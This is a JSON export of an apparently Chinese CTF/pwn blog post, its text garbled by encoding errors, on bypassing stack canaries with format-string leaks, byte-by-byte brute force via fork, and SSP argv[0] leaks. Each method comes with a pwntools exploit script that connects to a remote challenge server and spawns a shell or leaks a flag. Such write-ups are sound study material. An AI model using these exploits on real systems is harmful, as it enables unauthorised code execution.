{"title":"ç»•è¿‡canaryçš„å…­ç§æ–¹æ³•","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"ç»•è¿‡canaryçš„æ–¹æ³•","date":"2021-10-25T12:49:23.000Z","updated":"2021-11-15T15:21:43.888Z","comments":true,"path":"api/articles/ç»•è¿‡canaryçš„æ–¹æ³•.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/DCnioH4MfqYX28I.jpg","content":"<h1 id=\"leakç»•è¿‡\"><a href=\"#leakç»•è¿‡\" class=\"headerlink\" title=\"leakç»•è¿‡\"></a>leakç»•è¿‡</h1><p>é€šè¿‡æ³„éœ²canaryæ¥ç»•è¿‡canaryï¼Œå¸¸è§çš„æœ‰è¦†ç›–æ‰å‰é¢çš„\\x00è®©è¾“å‡ºå‡½æ•°æ³„éœ²ï¼Œè¿˜æœ‰printfå®šç‚¹æ³„éœ²</p>\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong>stackguard1</strong></h2><p>ä¸€ä¸ªç®€å•çš„64ä½canaryä¿æŠ¤ç¨‹åºï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸€å¼€å§‹ç¨‹åºä¼šä»fså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å€¼æ”¾å…¥raxä¸­ï¼Œraxä¼šæ”¾å…¥rbp-8çš„ä½ç½®ï¼Œæœ€åæ¸…é›¶eax<img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 195020.png\"></p>\n<p>ç¨‹åºè¿è¡Œåˆ°å¿«ç»“æŸæ—¶ï¼Œä¼šæ£€æŸ¥canaryï¼Œé¦–å…ˆå°†canaryå–å‡ºåˆ°rcxï¼Œrcxä¼šå’Œfså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å‡ºè¿›è¡Œæ¯”è¾ƒï¼Œä¸åŒå°±ä¼šè·³è½¬åˆ°__stack_chk_fail@pltä½ç½®<img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 195405.png\"></p>\n<p>__stack_chk_failå‡½æ•°ä¼šå¼ºè¡Œç»“æŸè¿›ç¨‹å¹¶å¼¹å‡ºè­¦å‘Š</p>\n<p>åˆ†ææ ˆç»“æ„ï¼šç¼“å†²åŒºè¿‡åå°±æ˜¯canaryï¼Œæ‰€ä»¥å¦‚æœæ˜¯ç®€å•çš„æº¢å‡ºè¦†ç›–è¿”å›åœ°å€å°±ä¼šè¦†ç›–åˆ°canaryï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚å› æ­¤ï¼Œå¦‚æœè¦åˆ©ç”¨æ ˆæº¢å‡ºå°±ä¸€å®šè¦ç»•è¿‡canaryã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯å…ˆé€šè¿‡è¾“å‡ºå‡½æ•°æ³„éœ²canaryçš„å€¼ï¼Œä¹‹ååœ¨è¦†ç›–æ—¶ç”¨æ³„éœ²çš„canaryå€¼è¦†ç›–canaryï¼Œå…¶å®ƒçš„å°±è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ ·å°±ç»•è¿‡äº†canaryã€‚</p>\n<p><img src=\"https://i.loli.net/2021/10/22/Rq56B1deJrujDh4.png\" alt=\"image.png\"></p>\n<p>é€šè¿‡å­—ç¬¦ä¸²åˆ—è¡¨æ‰¾åˆ°bin/shï¼Œæ‰¾åˆ°è°ƒç”¨çš„ä½ç½®ï¼Œå‘ç°å‡½æ•°canary_protect_meå‡½æ•°é‡Œé¢ä¼šè°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä»”ç»†åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥æ–­å®šåœˆé‡Œé¢çš„æ±‡ç¼–ä»£ç ç»„è£…æˆå‡½æ•°execve(â€œbin/shâ€,0,0) ç­‰ä»·äºsystem(â€œbin/shâ€)ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°è¿™é‡Œå°±å¯ä»¥è·å¾—shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 201418.png\"></p>\n<p>å› ä¸ºæ˜¯getså‡½æ•°æœ€åä¼šè¡¥ä¸Š\\x00ï¼Œä¼šç»ˆæ­¢printfè¯»å–ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡è¦†ç›–æ³„éœ²ï¼Œä½†å› ä¸ºæ˜¯printfè¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 203619.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = (<span class=\"number\">0x4011d6</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># æ³„éœ²å‡ºç¬¬åä¸€ä¸ªå‚æ•°çš„å€¼</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># å°†æ¥æ”¶çš„è½¬ä¸ºåå…­è¿›åˆ¶æ•°</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"one-by-oneçˆ†ç ´\"><a href=\"#one-by-oneçˆ†ç ´\" class=\"headerlink\" title=\"one by oneçˆ†ç ´\"></a>one by oneçˆ†ç ´</h1><p>è™½ç„¶æ¯æ¬¡é‡å¯ç¨‹åºçš„canaryä¼šä¸åŒï¼Œä½†æ˜¯åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ä¸åŒçš„çº¿ç¨‹ä¸­çš„canaryæ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´fork()å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­çš„canaryæ˜¯ç›¸åŒçš„ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥é€å­—èŠ‚çˆ†ç ´å‡ºæ¥ã€‚</p>\n<h2 id=\"bin1\"><a href=\"#bin1\" class=\"headerlink\" title=\"bin1\"></a>bin1</h2><p>ç¨‹åºä¸­å­˜åœ¨forkå‡½æ•°ï¼Œè€Œä¸”è¿˜æ˜¯æ— é™è¾“å‡ºï¼Œç¬¦åˆone by oneçˆ†ç ´æ¡ä»¶ï¼Œå› ä¸ºæ˜¯32ä½ç¨‹åºï¼Œcanaryç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯\\x00ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çˆ†ç ´3ä¸ªå­—èŠ‚ï¼Œè¿™ä¸‰ä¸ªå­—èŠ‚å¯¹åº”çš„åå…­è¿›åˆ¶ç èŒƒå›´ä¸º00~FF</p>\n<p><img src=\"https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-26 083224.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\">    libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;&#x27;</span>,)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;welcome\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;the &quot;</span> + <span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;: &quot;</span> + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">        p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">&quot;welcome\\n&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> a</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;sucess&quot;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;canary: &quot;</span> + canary</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">addr = <span class=\"number\">0x0804863B</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">100</span> + canary + <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">12</span> + p32(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"sspæ”»å‡»\"><a href=\"#sspæ”»å‡»\" class=\"headerlink\" title=\"sspæ”»å‡»\"></a>sspæ”»å‡»</h1><p>sspæ”»å‡»åŸç†æ˜¯é€šè¿‡è¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œå°±èƒ½è®©canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>) &#123;</span><br><span class=\"line\">\t__fortify_fail (<span class=\"string\">&quot;stack smashing detected&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (msg)</span><br><span class=\"line\">   <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg; &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The loop is added only to keep gcc happy. */</span></span><br><span class=\"line\">         <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">              __libc_message (<span class=\"number\">2</span>, <span class=\"string\">&quot;*** %s ***: %s terminated\\n&quot;</span>, msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ä¸Šé¢æ˜¯ stack_chk_fail()å‡½æ•°çš„æºç ï¼Œä¹Ÿå°±æ˜¯è§¦å‘canaryåè°ƒç”¨çš„å‡½æ•°ï¼Œåœ¨libc_messageå‡½æ•°ä¸­ç¬¬äºŒä¸ª%sè¾“å‡ºçš„å°±æ˜¯__libc_argv[0]ï¼Œargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå°†å…¶è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€ï¼Œå½“ç¨‹åºè§¦å‘åˆ°canaryæ—¶å°±å¯ä»¥æ³„éœ²æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿äº†ã€‚</p>\n<h2 id=\"smashes\"><a href=\"#smashes\" class=\"headerlink\" title=\"smashes\"></a>smashes</h2><p>ä¸»å‡½æ•°åªè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­å­˜åœ¨getså±é™©å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œæ ˆæº¢å‡ºæ“ä½œã€‚<img src=\"https://i.loli.net/2021/11/15/UrIOTvQfePFLdlj.png\" alt=\"image.png\"></p>\n<p>åœ¨å­—ç¬¦ä¸²çª—å£å‘ç°flagå­—æ ·ï¼Œæ ¹æ®æç¤ºæˆ‘ä»¬å¯ä»¥çŸ¥é“flagå°±åœ¨è¿™é‡Œï¼Œä¸è¿‡æ˜¯åœ¨è¿œç«¯ç¯å¢ƒä¸­<img src=\"https://i.loli.net/2021/11/15/vt1PArjFWlipJY9.png\" alt=\"image.png\"></p>\n<p>æ‰€ä»¥æˆ‘ä»¬åªè¦å°†argv[0]æŒ‡å‘è¿™ä¸ªåœ°å€å°±å¯ä»¥æ³„éœ²ã€‚</p>\n<p>ä½†æ˜¯åé¢å‘ç°è¡Œä¸é€šï¼Œå¹¶æ²¡æœ‰æ³„éœ²æˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€é‡Œé¢çš„å€¼ã€‚<img src=\"https://i.loli.net/2021/11/15/TZRsh7QgEb5V4Kd.png\" alt=\"image.png\"></p>\n<p>å›åˆ°ä¼ªä»£ç é‡Œé¢å‘ç°ä¸‹é¢ä¸€è¡Œ</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)((<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v0 + <span class=\"number\">0x600D20</span>LL), <span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(<span class=\"number\">32</span> - v0));</span><br></pre></td></tr></table></figure>\n\n<p>è¿™è¡Œä»£ç ä¼šå°†0x600D20è¿™ä¸ªåœ°å€é‡Œé¢çš„å€¼æ¸…ç©ºï¼Œå¯¼è‡´flagè¢«æ¸…é™¤ã€‚çœ‹äº†ä¸€ä¸‹ä¸€äº›å¸ˆå‚…çš„åšå®¢äº†è§£åˆ°ELFçš„é‡æ˜ å°„ã€‚<strong>å½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œä»–çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ã€‚ä¹Ÿå°±æ˜¯è¯´è¯¥flagä¼šåœ¨å…¶ä»–åœ°æ–¹è¿›è¡Œå¤‡ä»½ã€‚</strong></p>\n<p><img src=\"https://i.loli.net/2021/11/15/QGDmy4HdWTqeKcz.png\" alt=\"image.png\"></p>\n<p>åŒæ—¶è¿˜è¦æ³¨æ„ä¸€ç‚¹ï¼Œ64ä½ä¸‹åœ°å€éƒ½æ˜¯8çš„å€æ•°æ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬è¦æ³„éœ²çš„åœ°å€æ˜¯0x400d20</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;pwn.jarvisoj.com&quot;</span>,<span class=\"number\">9877</span>)</span><br><span class=\"line\">p.recvuntil(&#x27;name? &#x27;)</span><br><span class=\"line\">p.sendline(p64(<span class=\"number\">0x400d20</span>)*<span class=\"number\">300</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"åŠ«æŒ-stack-chk-fail\"><a href=\"#åŠ«æŒ-stack-chk-fail\" class=\"headerlink\" title=\"åŠ«æŒ___stack_chk_fail\"></a>åŠ«æŒ___stack_chk_fail</h1><p>æš‚æ—¶è¿˜æœªæ‰¾åˆ°ç›¸åº”é¢˜ç›®ï¼Œå…ˆæ”¾ä¸ªé“¾æ¥<a href=\"https://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/#login\">https://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/#login</a></p>\n","feature":true,"text":"leakç»•è¿‡é€šè¿‡æ³„éœ²canaryæ¥ç»•è¿‡canaryï¼Œå¸¸è§çš„æœ‰è¦†ç›–æ‰å‰é¢çš„\\x00è®©è¾“å‡ºå‡½æ•°æ³„éœ²ï¼Œè¿˜æœ‰printfå®šç‚¹æ³„éœ² stackguard1ä¸€ä¸ªç®€å•çš„64ä½canaryä¿æŠ¤ç¨‹åºï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸€å¼€å§‹ç¨‹åºä¼šä»fså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å€¼æ”¾å…¥raxä¸­ï¼Œraxä¼šæ”¾å…¥rbp-8çš„ä½...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":2,"path":"api/categories/pwn.json"}],"tags":[{"name":"ç¬”è®°","slug":"ç¬”è®°","count":2,"path":"api/tags/ç¬”è®°.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#leak%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">leakç»•è¿‡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#one-by-one%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">one by oneçˆ†ç ´</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bin1\"><span class=\"toc-text\">bin1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssp%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">sspæ”»å‡»</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#smashes\"><span class=\"toc-text\">smashes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8A%AB%E6%8C%81-stack-chk-fail\"><span class=\"toc-text\">åŠ«æŒ___stack_chk_fail</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T14:11:44.271Z","comments":true,"path":"api/articles/è¥¿æ¹–è®ºå‰‘pwnå¤ç°.json","keywords":null,"cover":[],"text":" ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“ blindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰ æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","updated":"2021-11-06T02:20:32.088Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","text":"pwn03å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ æ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š æ³„éœ² putsåœ°å€ è·å– libc ç‰ˆæœ¬ è·å– system åœ°å€ä¸ /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","count":6,"path":"api/categories/åˆ·é¢˜.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}